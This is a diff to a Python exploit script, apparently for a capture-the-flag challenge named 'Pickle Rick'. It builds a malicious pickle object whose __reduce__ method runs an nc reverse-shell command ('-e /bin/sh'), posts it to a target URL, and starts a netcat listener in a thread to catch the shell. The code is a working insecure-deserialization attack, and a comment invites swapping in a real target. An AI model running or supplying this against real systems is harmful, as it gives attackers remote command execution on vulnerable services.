@@ -3,7 +3,8 @@ import base64
 import pickle
 import os
 import requests
-import time 
+import threading
+import time
 
 # Payload to be executed (nc reverse shell payload)
 payload = "nc -v 127.0.0.1 1234 -e /bin/sh"
@@ -14,6 +15,10 @@ class Exploit:
     # __reduce__ method for serialization and deserialization
     def __reduce__(self):
         return os.system, (payload,)
+
+def listener_thread():
+    print(f'[*] Starting listener')
+    os.system("nc -lvnp 1234")
 
 def exploit(url):
     # Create an instance of the Exploit class
@@ -34,10 +39,15 @@ if __name__ == "__main__":
     # Example usage
     target_url = "http://127.0.0.1:1337"  # Replace with the actual target URL
 
-print(f'[*]' ' Starting listener')
-os.system("nc -lvnp 1234")
+    # Start the listener thread
+    listener_thread = threading.Thread(target=listener_thread)
+    listener_thread.start()
 
-time.sleep(2)
+    # Sleep for a moment to allow the listener to start
+    time.sleep(2)
 
-print(f'[*]' ' Executing program: Pickle Rick..')
-exploit(target_url)
+    print("[*] Executing program: Pickle Rick..")
+    exploit(target_url)
+
+    # Wait for the listener thread to finish
+    listener_thread.join()
